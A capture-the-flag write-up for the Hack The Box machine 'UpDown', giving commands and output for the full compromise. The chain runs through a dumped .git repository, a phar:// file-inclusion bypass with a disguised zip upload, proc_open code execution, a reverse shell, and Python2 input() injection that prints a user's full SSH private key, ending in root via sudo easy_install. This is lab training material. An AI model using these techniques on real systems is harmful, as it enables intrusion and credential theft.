# UpDown

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled.jpeg)

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/UpDown]
└─$ nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.11.177
Nmap scan report for 10.10.11.177
Host is up (0.50s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

## Web Enumeration ⤵️

I loaded port 80 and I got this `siteisup.htb` domain name display on webpage so I set the /etc/hosts file then I checked the input file seams like SSRF vulnerability but moving on to that direction I also checked for directory or files bruteforcing and got `.git` directory.

```bash
200      GET      320l      675w     5531c http://siteisup.htb/stylesheet.css
200      GET       40l       93w     1131c http://siteisup.htb/
301      GET        9l       28w      310c http://siteisup.htb/dev => http://siteisup.htb/dev/
200      GET       40l       93w     1131c http://siteisup.htb/index.php
200      GET        0l        0w        0c http://siteisup.htb/dev/index.php
```
{: .nolineno}

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/UpDown]
└─$ dirb http://siteisup.htb/dev/                            

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec 30 14:34:18 2023
URL_BASE: http://siteisup.htb/dev/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://siteisup.htb/dev/ ----
+ http://siteisup.htb/dev/.git/HEAD (CODE:200|SIZE:21)
...
```
{: .nolineno}

I got this git directory so lets access it through `git-dumper` command →

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled.png)

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/UpDown]
└─$ git-dumper 'http://siteisup.htb/dev/.git' git/
[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://siteisup.htb/dev/.git/ [200]
[-] Fetching http://siteisup.htb/dev/.gitignore [404]
[-] http://siteisup.htb/dev/.gitignore responded with status code 404
[-] Fetching http://siteisup.htb/dev/.git/objects/ [200]
[-] Fetching http://siteisup.htb/dev/.git/config [200]
[-] Fetching http://siteisup.htb/dev/.git/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/description [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/ [200]
[-] Fetching http://siteisup.htb/dev/.git/index [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/branches/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/tags/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/packed-refs [200]
[-] Fetching http://siteisup.htb/dev/.git/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/info/exclude [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD [200]
[-] Running git checkout .
Updated 6 paths from the index
```
{: .nolineno}

Now lets investigate the git file through these commands →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/UpDown/git]
└─$ ls -al
total 40
drwxr-xr-x 3 kali kali 4096 Dec 30 12:11 .
drwxr-xr-x 3 kali kali 4096 Dec 30 14:15 ..
-rw-r--r-- 1 kali kali   59 Dec 30 12:11 admin.php
-rw-r--r-- 1 kali kali  147 Dec 30 12:11 changelog.txt
-rw-r--r-- 1 kali kali 3145 Dec 30 12:11 checker.php
drwxr-xr-x 7 kali kali 4096 Dec 30 12:11 .git
-rw-r--r-- 1 kali kali  117 Dec 30 12:11 .htaccess
-rw-r--r-- 1 kali kali  273 Dec 30 12:11 index.php
-rw-r--r-- 1 kali kali 5531 Dec 30 12:11 stylesheet.css
```
{: .nolineno}

these command will help to get more information about the git files :

```bash
git status
git log
```
{: .nolineno}

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%201.png)

I noticed the vhost site and some information →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/UpDown/git]
└─$ cat .htaccess  
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
{: .nolineno}

I have to include this site header to access some sites or vhost →

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%202.png)

I bruteforce the subdomains with that header →

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%203.png)

I added the `/etc/hosts` file with that domain name →

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%204.png)

Lets check the `checker.php` file to upload the file into the site →

```php
<?php

function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url));
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}

if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
}

function getExtension($file) {
	$extension = strrpos($file,".");
	return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
```
{: .nolineno}

- The code checks if a POST request with a **`check`** parameter is sent to the server. If yes, it performs the following steps:
    - It checks the size of the uploaded file. If it is larger than 10kb, it stops the execution and displays an error message.
    - It gets the extension of the uploaded file using the **`getExtension`** function, which returns the part of the file name after the last dot. If the extension is one of the forbidden ones, such as php, html, py, etc., it stops the execution and displays an error message.
    - It creates a directory under the **`uploads`** folder with a name based on the MD5 hash of the current time. [If the directory does not exist, it creates it with the permission 0770, which means the owner and the group can read, write and execute, but others can only execute](https://builtin.com/software-engineering-perspectives/php).
    - It moves the uploaded file to the newly created directory and assigns it the same name as the original file.
    - It reads the content of the uploaded file, which is supposed to be a list of websites separated by newlines. It splits the content by newlines and stores it in an array called **`$websites`**.
    - It loops through each website in the array and trims any whitespace from it. It then checks if the website does not start with **`file://`**, **`data://`**, or **`ftp://`**, which are considered as hacking attempts. If not, it calls the **`isitup`** function with the website as the argument and stores the result in a variable called **`$check`**. If the result is true, it displays the website and a green message saying it is up. If the result is false, it displays the website and a red message saying it is down. If the website starts with one of the forbidden schemes, it displays a red message saying hacking attempt was detected.
    - It deletes the uploaded file from the server using the **`unlink`** function.
- The code ends with the definition of the **`getExtension`** function, which was used earlier.

So I will be uploading the zip file but not in `.zip` extension so lets try it out now →

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%205.png)

I get this error because the magic byte of zip starts with PK. so lets check the uploaded directory weather it is uploaded or not →

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%206.png)

I can access this md5 generated folder name that contains my file so lets access it through LFI method.

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%207.png)

Now lets access through LFI .The `phar://` wrapper works with the format `phar://[archive path]/[file inside the archive]`. I tried different php function but didn’t got any output so I tried phpinfo() function and I got the output →

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%208.png)

Lets check the disable function on this `phpinfo()` file and lets use the non disabled functions for command execution .

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%209.png)

 

Now I have 2 more rest functions that can leads to command execution ⤵️ 

• **`proc_open`**: This function executes a command and opens file pointers for input/output. It can also return a resource that represents the process.

• **`backticks`**: This is an operator that is equivalent to **`shell_exec`**. It can be used to execute a command and assign the output to a variable, such as **`$output =`** ls -l``.

I used the `backticks` functions and got no output so I used another `proc_open` function for command execution →

 

```php
<?php
// Define a Linux command to execute
$command = "ls -l";

// Define the descriptor array for the subprocess
$descriptors = array(
  0 => array("pipe", "r"), // STDIN
  1 => array("pipe", "w"), // STDOUT
  2 => array("pipe", "w")  // STDERR
);

// Execute the command and get the process resource
$process = proc_open($command, $descriptors, $pipes);

// Read the output from the STDOUT pipe
$output = stream_get_contents($pipes[1]);

// Display the output
echo $output;

// Close all pipes and processes
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```
{: .nolineno}

Now I made the zip file →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/UpDown]
└─$ nano proc_open.php         
                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/HTB/UpDown]
└─$ zip file.mp4 proc_open.php 
  adding: proc_open.php (deflated 50%)

┌──(kali㉿kali)-[~/Downloads/HTB/UpDown]
└─$ file file.mp4 
file.mp4: Zip archive data, at least v2.0 to extract, compression method=deflate
```
{: .nolineno}

I uploaded the file and loaded on web and got the output like this →

![Untitled](UpDown%20d1ae16d482b549cfb28e051caa2ccabd/Untitled%2010.png)

Now lets have a reverse shell →

```bash
http://dev.siteisup.htb/?page=phar://uploads/483d0d679db9db1bf8381828972bc6a9/file.mp4/proc_open
```
{: .nolineno}

In netcat listener I got the reverse shell connection →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/UpDown]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.177] 41410
bash: cannot set terminal process group (909): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev$ whoami
whoami
www-data
www-data@updown:/var/www/dev$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@updown:/var/www/dev$
```
{: .nolineno}

I got this file with SUIDs permissions →

```bash

www-data@updown:/home/developer/dev$ ls -al
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22  2022 .
drwxr-xr-x 6 developer developer  4096 Aug 30  2022 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py
www-data@updown:/home/developer/dev$
```
{: .nolineno}

Now I see the file siteisup content →

```bash
www-data@updown:/home/developer/dev$ strings siteisup
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
setresgid
setresuid
system
getegid
geteuid
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Welcome to 'siteisup.htb' application
/usr/bin/python /home/developer/dev/siteisup_test.py
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crtstuff.c
...
...
```
{: .nolineno}

Lets see the `siteisup_test.py` file →

```bash
www-data@updown:/home/developer/dev$ cat siteisup_test.py 
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
www-data@updown:/home/developer/dev$
```
{: .nolineno}

I tried the simple URL and I get this error .That’s because in Python2, `input` takes the input and passes it to `eval`, and my input isn’t valid python. I can pass it a one liner that will execute and get execution:

```bash
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:http://10.10.16.10/
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1
    http://10.10.16.10/
        ^
SyntaxError: invalid syntax
www-data@updown:/home/developer/dev$
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('id')                                 
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```
{: .nolineno}

I can also get the developer shell through this command →

```bash
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('bash')
developer@updown:/home/developer/dev$ whoami
developer
developer@updown:/home/developer/dev$ id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
developer@updown:/home/developer/dev$
```
{: .nolineno}

Lets have the `private keys` of developer user →

```python
__import__('os').system('cat /home/developer/.ssh/id_rsa')
```
{: .nolineno}

I use it to access the private keys of developer user →

```bash
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('cat /home/developer/.ssh/id_rsa')
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
...
...
www-data@updown:/home/developer/dev$
```
{: .nolineno}

Lets use this private key to access the developer user shell →

```python
┌──(kali㉿kali)-[~/Downloads/HTB/UpDown]
└─$ ssh developer@10.10.11.177 -i id_rsa                      
The authenticity of host '10.10.11.177 (10.10.11.177)' can't be established.
ED25519 key fingerprint is SHA256:c0DzrPfIOA6IA7zGJh7Ee/FJ3B2g7R2KnzeUif9zCWQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.177' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec 30 08:46:05 UTC 2023

  System load:           0.08
  Usage of /:            49.9% of 2.84GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.177
  IPv6 address for eth0: dead:beef::250:56ff:feb9:ec82

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36
developer@updown:~$ whoami
developer
developer@updown:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)
developer@updown:~$
```
{: .nolineno}

Now lets move further →

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
developer@updown:~$
```
{: .nolineno}

I found the exploit through [GTFOBin](https://gtfobins.github.io/gtfobins/easy_install/#sudo) →

```bash
developer@updown:/tmp$ TF=$(mktemp -d)
developer@updown:/tmp$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:/tmp$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.L1OIVDJdYk
Writing /tmp/tmp.L1OIVDJdYk/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.L1OIVDJdYk/egg-dist-tmp-lLxWgc
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -al
total 44
drwx------  6 root root 4096 Dec 30 06:38 .
drwxr-xr-x 19 root root 4096 Aug  3  2022 ..
lrwxrwxrwx  1 root root    9 Jul 27  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root   11 Jun 22  2022 .bash_logout
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Jun 22  2022 .cache
drwxr-xr-x  3 root root 4096 Jul 27  2022 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   66 Aug  1  2022 .selected_editor
drwx------  2 root root 4096 Jun 22  2022 .ssh
-rw-r-----  1 root root   33 Dec 30 06:38 root.txt
drwx------  3 root root 4096 Jun 22  2022 snap
# cat root.txt
39ddd8eb7ecdad477bd19568207a0891
#
```
{: .nolineno}

I am root now !